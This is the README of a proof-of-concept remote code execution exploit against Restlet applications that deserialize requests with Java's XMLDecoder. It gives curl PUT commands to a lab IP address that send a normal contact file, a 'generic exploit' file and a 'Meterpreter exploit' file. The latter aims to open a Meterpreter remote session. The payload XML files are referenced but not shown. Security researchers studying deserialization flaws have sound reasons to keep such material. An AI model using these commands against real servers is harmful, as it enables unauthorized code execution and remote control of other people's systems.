## RestletXMLDecoder

RCE Exploit PoC for Restlet application using XMLDecoder as Unmarshaler

Expected use:
curl -X PUT --header "content-type: application/x-java-serialized-object+xml" --data @contact.xml "http://192.168.239.146:8180/contacts"

Generic Exploit:
curl -X PUT --header "content-type: application/x-java-serialized-object+xml" --data @contact-rce.xml "http://192.168.239.146:8180/contacts"

Meterpreter Exploit:
curl -X PUT --header "content-type: application/x-java-serialized-object+xml" --data @contact-met.xml "http://192.168.239.146:8180/contacts"

